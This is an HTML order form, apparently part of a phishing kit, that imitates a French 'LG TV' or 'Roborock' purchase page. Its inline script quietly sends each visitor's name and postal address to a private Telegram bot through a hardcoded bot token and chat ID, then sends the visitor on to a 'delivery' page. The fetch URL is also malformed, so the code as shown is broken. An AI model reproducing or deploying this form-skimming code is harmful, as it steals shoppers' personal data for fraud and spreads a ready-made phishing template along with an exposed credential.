<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Commande - LG TV</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        /* نفس التنسيقات الموجودة دون تغيير */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
            color: #333;
        }
        /* بقية التنسيقات كما هي */
    </style>
</head>
<body>
    <!-- باقي محتوى الصفحة كما هو -->
    <div class="navbar">
        <div class="logo">Roborock</div>
        <ul>
            <li><a href="#">Accueil</a></li>
            <li><a href="#">Produits</a></li>
            <li><a href="#">Contact</a></li>
        </ul>
    </div>

    <!-- فورم البيانات -->
    <div class="container">
        <h2>Remplissez vos informations</h2>
        <form id="order-form" action="page-livraison1.html" method="GET">
            <div class="form-group">
                <label for="prenom">Prénom *</label>
                <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prénom">
            </div>
            <div class="form-group">
                <label for="nom">Nom *</label>
                <input type="text" id="nom" name="nom" required placeholder="Entrez votre nom">
            </div>
            <div class="form-group">
                <label for="rue">Rue *</label>
                <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
            </div>
            <div class="form-group">
                <label for="numero">N°</label>
                <input type="tel" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
            </div>
            <div class="form-group">
                <label for="code_postal">Code postal *</label>
                <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
            </div>
            <div class="form-group">
                <label for="ville">Ville *</label>
                <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
            </div>
            <div class="form-group">
                <input type="submit" value="Confirmer La Commande">
            </div>
        </form>
    </div>

    <!-- سكريبت جافاسكريبت لإرسال البيانات إلى تلغرام -->
    <script>
        // توكن البوت وChat ID
        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
        const chatId = "5372119436";

        // وظيفة إرسال البيانات إلى تلغرام
        function sendToTelegram(data) {
            const url = https://api.telegram.org/bot${token}/sendMessage;
            const message = `
            🌟 طلب جديد 🌟
            👤 الاسم: ${data.nom} ${data.prenom}
            🏠 العنوان: ${data.rue} - رقم: ${data.numero}, ${data.ville} (${data.code_postal})
            `;
            return fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
        }

        // استماع للفورم ومعالجة الإرسال
        document.getElementById("order-form").addEventListener("submit", function (e) {
            e.preventDefault(); // منع الإرسال الافتراضي

            const data = {
                prenom: document.getElementById("prenom").value,
                nom: document.getElementById("nom").value,
                rue: document.getElementById("rue").value,
                numero: document.getElementById("numero").value || "غير مذكور",
                code_postal: document.getElementById("code_postal").value,
                ville: document.getElementById("ville").value,
            };

            // إرسال البيانات إلى تلغرام
            sendToTelegram(data)
                .then(response => {
                    if (response.ok) {
                        // إعادة توجيه المستخدم إلى الصفحة
                        alert("تم إرسال البيانات بنجاح! يتم الآن تحويلك...");
                        this.submit();
                    } else {
                        alert("حدث خطأ أثناء إرسال البيانات إلى تلغرام.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
                });
        });
    </script>
</body>
</html>
